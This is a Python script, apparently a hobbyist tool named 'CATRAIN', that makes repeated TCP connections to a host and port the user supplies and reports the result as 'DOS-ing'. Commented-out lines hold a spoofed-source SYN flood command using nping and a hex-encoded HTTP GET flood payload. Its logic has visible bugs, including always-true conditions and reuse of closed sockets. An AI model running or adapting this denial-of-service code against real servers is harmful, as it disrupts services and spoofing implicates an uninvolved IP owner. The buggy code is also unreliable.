print("ᓚᘏᗢ CATRAIN ᗢᘏᓗ by Lmaos, Queen >⩊<"); 

#! prev version (https://github.com/LmaosDev/lmaoscripts/releases/tag/catrain-pre-1.1) and unused material for a potential next version: 
#try: subprocess.check_output("nmap", shell=True).decode(); ip = input("ip: > "); count = input("count: > "); rate = input("rate: > "); print(subprocess.check_output(f'nping -N -c {count} --rate {rate} --tcp {ip} --flags SYN --ttl 12 --safe-payloads -S 35.76.98.241 --tr --badsum', shell=True).decode()) 
#except Exception as e: input("\nListen...\n\n>>>\tYou're gonna have to install nping/nmap/npcap/usbpcap/zenmap first.\n\n\n\tGot it?\n\n Process raised Error:" + str(e) + "\n\t> ") 
# 
#match str(input("Connection type: HTTP(HTML)/SYN: > ")).lower:
#    case "html"|"http": p="HTML GET"; # HTML GET 
#    case "syn": p="SYN"; # SYN 
#if p == "syn":
#    msg = 0x02; port = input("\tPort:\t\tdefault: None\t> ") 
#else:msg = 0x474554202f20485454502f312e300d0a0d0a; 


from socket import socket,AF_INET,SOCK_STREAM#; p = ""; import datetime 
bool_bind = True; bool_close = bool; bind_port = int
try: 
    ip = input("Server hostname or IP:\tdefault: ::\t> ") or "127.0.0.1" 
    port = input("\tPort:\t\tdefault: 80\t> ") or "80" 
    count = input("Count:\t\t\tdefault:  3\t> ") or 3 
    if (input("Close connections automatically? (yes/y/no/n) (default: yes)> ").lower() == 'no' or 'n') == True: 
        bool_close = False 
    else: 
        bool_close = True 
    if (input("Limit to one port client side? (yes/y/no/n) (default: yes) > ").lower() == 'no' or 'n' == True): 
        bool_bind = False; 
    else: 
        temp = input("Port to bind to (default: 8000) > ") 
        if temp != '':
            bind_port = int(temp) 
        else: bind_port = 8000 
    if bool_bind == True: 
        input(f"\nINFO:\n - Connect to '{ip}' on port '{port}'\nClose ports:\t\t\t{bool_close}\nBind to port clientside:\t{bool_bind}\t& port:{bind_port}\nContinue? ^C to cancel > ") 
    else: 
        input(f"\nINFO:\n - Connect to '{ip}' on port '{port}'\nClose connections:\t\t\t{bool_close}\nBind to port clientside:\t{bool_bind}\nContinue? ^C to cancel > ") 
except KeyboardInterrupt: print("\nKeyboardInterrupt: Process cancelled.\n"); exit() 

ec = 0
if port != "" or None: 
    if bool_bind == False:
        for i in range(int(count)):  
            #AF_INET is for IPv4 - SOCK_STREAM is for TCP 
            sock = socket(AF_INET, SOCK_STREAM) 
            try: sock.connect((ip, int(port))); 
            except Exception as e: print("CONN/DISC no. ", i+1, "\tfailed: ", e); ec += 1; sock.close() 
            if bool_close == True: sock.close() 
            print("CONN/DISC no. ", i+1) 
    else: 
        sock = socket(AF_INET, SOCK_STREAM); sock.bind(("127.0.0.1", bind_port)) 
        for i in range(int(count)):  
            try: sock.connect((ip, int(port))); 
            except Exception as e: print("CONN/DISC no. ", i+1, "\tfailed: ", e); ec += 1; sock.close() 
            if bool_close == True: sock.close() 
            print("CONN/DISC no. ", i+1) 
else:
    if bool_bind == False:
        for i in range(int(count)):  
            sock = socket(AF_INET, SOCK_STREAM) 
            try: sock.connect(ip); 
            except Exception as e: print("CONN/DISC no. ", i+1, "\tfailed: ", e); ec += 1; sock.close() 
            if bool_close == True: sock.close() 
            print("CONN/DISC no. ", i+1) 
    else: 
        sock = socket(AF_INET, SOCK_STREAM); sock.bind(("127.0.0.1", bind_port)) 
        for i in range(int(count)):  
            try: sock.connect(ip); 
            except Exception as e: print("CONN/DISC no. ", i+1, "\tfailed: ", e); ec += 1; sock.close() 
            if bool_close == True: sock.close() 
            print("CONN/DISC no. ", i+1) 
input(f"\n~Finished DOS-ing~\nSTATS:\nConnections attempted:\tConnections succeded:\n{count}\t\t\t{int(count)-ec}\n") 
